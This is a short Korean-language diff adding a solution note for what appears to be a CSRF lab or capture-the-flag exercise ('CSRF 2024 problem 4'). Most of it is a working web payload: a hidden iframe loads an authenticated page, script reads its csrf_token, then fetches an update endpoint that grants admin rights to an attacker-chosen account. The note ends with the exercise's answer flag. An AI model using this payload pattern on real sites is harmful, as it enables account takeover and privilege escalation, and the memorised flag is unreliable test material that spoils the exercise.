@@ -1,0 +1,12 @@
+===========================
+CSRF 2024 4번
+===========================
+
+1. 공격 구문
+	<iframe id='atkframe' src="https://lab.eqst.co.kr:8442/community15/authpage" style="display:none;"></iframe>
+<script>window.onload = function () {var token = window.document.getElementById("atkframe").contentWindow.document.getElementsByName('csrf_token')[0].value;url = "https://lab.eqst.co.kr:8442/bbs11/updateTokenAuth?csrf_token=" + token +  "&loginId=CR7@SIUU.com&adminYn=2";fetch(url);}</script>
+
+2. 정답
+	last_answer_perfect
+	
+===========================
